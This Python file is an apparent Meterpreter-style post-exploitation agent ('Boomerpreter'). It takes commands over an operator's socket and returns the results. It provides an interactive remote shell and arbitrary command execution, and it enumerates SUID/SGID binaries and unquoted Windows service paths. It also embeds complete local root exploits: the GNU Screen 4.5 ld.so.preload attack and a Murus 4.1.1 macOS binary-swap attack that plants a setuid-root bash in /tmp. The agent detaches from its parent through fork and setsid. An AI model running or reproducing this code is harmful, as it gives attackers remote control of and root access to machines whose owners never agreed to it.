import json
import os
import platform
import shutil
import stat
import subprocess
import sys
import threading
import time
from platform import python_version

try:
    import pty

    has_pty = True
except Exception:
    has_pty = False

try:
    import termios

    has_termios = True
except Exception:
    has_termios = False


class Boomerpreter:
    def __init__(self, s):
        self.socket = s
        self.channel = None
        self.platform_os = platform.platform()
        self.py_version = 3 if python_version().startswith("3") else 2
        self.options = {
            "suid_sgid": "get_suid_sgid",
            "exit": "exit",
            "shell": "get_shell",
            "root_screen45": "exploit_screen45",
            "check_vuln": "check_vuln",
            "unquoted_services": "unquoted_services",
            "murus_root": "murus_exploit"
        }

    def set_socket(self, s):
        self.socket = s

    def run(self):
        self.socket.send(self.platform_os.encode())
        while True:
            data_rcv = self.recv_data()
            func = data_rcv["function"]
            args = data_rcv["args"]
            try:
                if opt := self.options[func]:
                    data = getattr(self, opt)(args)
            except Exception as e:
                data = f"Error: Operation {str(e)} not found"
            if not data:
                continue
            if data == "exit":
                break
            self.send_data(data)

    def recv_data(self):
        data = self.socket.recv(1024)
        data = data.decode()
        return json.loads(data)

    def send_data(self, data):
        data = json.dumps(data)
        data = data.encode()
        self.socket.send(data)

    def exit(self):
        with contextlib.suppress(Exception):
            self.socket.close()
        return "exit"

    # CALL FUNCTIONS BEGIN
    # ----------
    # LINUX
    # ----------
    def get_suid_sgid(self, request):
        if len(request) == 0:
            return "Error: This function needs args"
        files = ""
        for my_dir in request:
            files_suid = []
            files_sgid = []
            files += f"[__ {my_dir} __]"
            try:
                for f in os.listdir(my_dir):
                    aux_file = os.path.join(my_dir, f)
                    if os.path.isfile(aux_file):
                        result = self._is_suid_sgid(aux_file)
                        if result[0]:
                            files_suid.append(result[0])
                        if result[1]:
                            files_sgid.append(result[1])
            except Exception:
                files += "Non-existing directory"
                continue
            files_suid = "\n".join(files_suid)
            files_sgid = "\n".join(files_sgid)
            files += "\n---SUID---\n" + files_suid + "\n---SGID---\n" + files_sgid
        return files

    def get_shell(self, request):
        if not has_pty:
            return "No"
        request = '/bin/sh' if len(request) == 0 else request[0]
        cmd = ['/bin/sh', '-c', request]
        master, slave = pty.openpty()
        if has_termios:
            settings = termios.tcgetattr(master)
            settings[3] = settings[3] & ~termios.ECHO
            termios.tcsetattr(master, termios.TCSADRAIN, settings)
        channel = STDProcess(cmd, stdin=slave, stdout=slave, stderr=slave, bufsize=0)
        channel.stdin = os.fdopen(master, 'wb')
        channel.stdout = os.fdopen(master, 'rb')
        channel.stderr = open(os.devnull, 'rb')
        channel.start()
        read = True
        while True:
            if not read:
                recv = self.socket.recv(1024)
                if len(recv) == 0:
                    break
                if b"exit" in recv:
                    with contextlib.suppress(Exception):
                        channel.kill()
                    return None
                channel.write(recv)
            read = False
            data = bytes()
            if channel.stderr_reader.is_read_ready():
                data = channel.stderr_reader.read()
            elif channel.stdout_reader.is_read_ready():
                data = channel.stdout_reader.read()
            elif channel.poll() != None:
                self.socket.send(b"bye")
                return None
            if data:
                self.socket.sendall(data)
            else:
                read = True
            time.sleep(1)

    def check_vuln(self, request):
        if len(request) == 0:
            return "Error: This function needs args"
        to_check = request[0]
        try:
            result = subprocess.Popen(to_check.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
        except Exception:
            result = b"No Found"
        return result.decode()

    def exploit_screen45(self, request):
        try:
            self.treat_files_screen45()
        except Exception:
            return "Error creating files"
        try:
            self.compile_files_screen45()
        except Exception:
            return "Error compiling files"
        return "ok"

    # ----------
    # WINDOWS
    # ----------
    def unquoted_services(self, request):
        found = False
        blank = " "
        result = ""
        try:
            services = subprocess.check_output(["sc", "query", "type=", "service"], universal_newlines=True)
            for service in services.split("\n"):
                # English or Spanish...
                if "SERVICE_NAME" in service or "NOMBRE_SERVICIO" in service:
                    data = service.split(":")[1].strip()
                    with contextlib.suppress(Exception):
                        info = subprocess.check_output(["sc", "qc", data], universal_newlines=True)
                        s_name = None
                        s_path = None
                        s_start = None
                        for entry in info.split("\n"):
                            if ("BINARY_PATH_NAME" in entry or "NOMBRE_RUTA_BINARIO" in entry) \
                                    and ('\"' not in entry):
                                aux = entry.split(": ")[1].strip()
                                if (blank in aux.split(" -k ")[0]) and (blank in aux.split(" /")[0]):
                                    s_name = data
                                    s_path = aux
                            elif "SERVICE_START_NAME" in entry or "NOMBRE_INICIO_SERVICIO" in entry:
                                s_start = entry.split(": ")[1]
                        if s_name:
                            found = True
                            result += f"[*] Service: {s_name}" + "\n"
                            result += f"    - Path: {s_path}" + "\n"
                            result += f"    - Service Start: {s_start}" + "\n"
        except Exception as e:
            result = str(e)
        if not found:
            result = "No service with these characteristics has been found"

        return result

    # ---------
    # MacOS
    # ---------
    def murus_exploit(self, request):
        file1 = "/tmp/murus411_exp.c"
        file2 = "/tmp/murus411_exp2.c"
        try:
            with open(file1, "wb") as f1:
                f2 = open(file2, "wb")

                f1.write(b"""
            #include <unistd.h>
            int main()
            {
            setuid(0);
            seteuid(0);
            execl("/bin/bash","bash","-c","rm -f /tmp/murus411_exp; /bin/bash",NULL);
            return 0;
            }
            """)
            f2.write(b"""
            #include <unistd.h>
            #include <stdlib.h>
            int main()
            {
            setuid(0);
            seteuid(0);
            system("chown root:wheel /tmp/murus411_exp");
            system("chmod 4755 /tmp/murus411_exp");
            system("mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
            Murus.app/Contents/MacOS/Murus");
            execl("/Applications/Murus.app/Contents/MacOS/Murus","Murus",NULL);
            return 0;
            }
            """)
            f2.close()

            os.popen("""
            gcc /tmp/murus411_exp.c -o /tmp/murus411_exp;
            gcc /tmp/murus411_exp2.c -o /tmp/murus411_exp2;
            rm -f %s; rm -f %s;
            """ % (file1, file2))
        except Exception as e:
            return str(e)
        try:
            while True:
                data = os.system(
                    "ps auxwww | grep '/Applications/Murus.app/Contents/MacOS/MurusLoader' | grep -v grep 1> /dev/null")
                if data == 0:
                    break
                time.sleep(1)

            shutil.move("/Applications/Murus.app/Contents/MacOS/Murus",
                        "/Applications/Murus.app/Contents/MacOS/Murus.orig")
            shutil.move("/tmp/murus411_exp2", "/Applications/Murus.app/Contents/MacOS/Murus")
        except Exception as e:
            return str(e)

        while True:
            data = subprocess.check_output(["ls", "-la", "/tmp/murus411_exp"])
            if b"root" in data:
                break
            time.sleep(1)
        return "ok"
        # system("/tmp/murus411_exp")

    # CALL FUNCTIONS END

    # AUXILIAR FUNCTIONS BEGIN

    def _is_suid_sgid(self, file_name):
        results = []
        try:
            f = os.stat(file_name)
            mode = f.st_mode
        except Exception:
            return [None, None]
        if (mode & stat.S_ISUID) == 2048:
            results.append(file_name)
        else:
            results.append(None)
        if (mode & stat.S_ISGID) == 1024:
            results.append(file_name)
        else:
            results.append(None)
        return results

    def treat_files_screen45(self):
        with open("/tmp/libhax.c", "w") as libhax:
            libhax.write('''
            #include <stdio.h>
            #include <sys/types.h>
            #include <unistd.h>
            __attribute__ ((__constructor__))
            void dropshell(void){
                chown("/tmp/shell", 0, 0);
                chmod("/tmp/shell", 04755);
                uid_t getuid(void){
                    return 0;
                }
                
            }
            ''')
        with open("/tmp/shell.c", "w") as shell:
            shell.write('''
                #include <stdio.h>
                int main(void){
                unlink("/etc/ld.so.preload");
                execvp("/bin/sh", NULL, NULL);
                }
                ''')

    def compile_files_screen45(self):
        os.popen("""
            screen -D -m gcc -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 2> /dev/null;
            screen -D -m gcc -z execstack -o /tmp/shell /tmp/shell.c 2> /dev/null;
            rm -f /tmp/shell.c; rm -f /tmp/libhax.c
            """)
        os.popen('''
            umask 0;
            screen -D -m -q -L /etc/ld.so.preload echo -ne  "/tmp/libhax.so";
            ''')
        time.sleep(3)
        os.system("screen -lsq 2>&1 >/dev/null")

    # AUXILIAR FUNCTIONS END


# Thanks Metasploit
class STDProcessBuffer(threading.Thread):
    def __init__(self, std, is_alive):
        threading.Thread.__init__(self)
        self.std = std
        self.is_alive = is_alive
        self.data = bytes()
        self.data_lock = threading.RLock()

    def run(self):
        for byte in iter(lambda: self.std.read(1), bytes()):
            self.data_lock.acquire()
            self.data += byte
            self.data_lock.release()

    def is_read_ready(self):
        return len(self.data) != 0

    def peek(self, l=None):
        data = bytes()
        self.data_lock.acquire()
        data = self.data if l is None else self.data[:l]
        self.data_lock.release()
        return data

    def read(self, l=None):
        self.data_lock.acquire()
        data = self.peek(l)
        self.data = self.data[len(data):]
        self.data_lock.release()
        return data


# Thanks Metasploit
class STDProcess(subprocess.Popen):
    def __init__(self, *args, **kwargs):
        subprocess.Popen.__init__(self, *args, **kwargs)
        self.echo_protection = False

    def start(self):
        self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() is None)
        self.stdout_reader.start()
        self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() is None)
        self.stderr_reader.start()

    def write(self, channel_data):
        self.stdin.write(channel_data)
        self.stdin.flush()


# s is the socket
import contextlib

address = s.getpeername()
if hasattr(os, 'fork'):
    pid = os.fork()
    if pid > 0:
        print("Meterpreter is running!")  # test purposes
        sys.exit(0)

    if pid == 0 and hasattr(os, 'setsid'):
        with contextlib.suppress(OSError):
            os.setsid()
try:
    boomerpreter = Boomerpreter(s)
    boomerpreter.run()
except Exception:
    time.sleep(6)
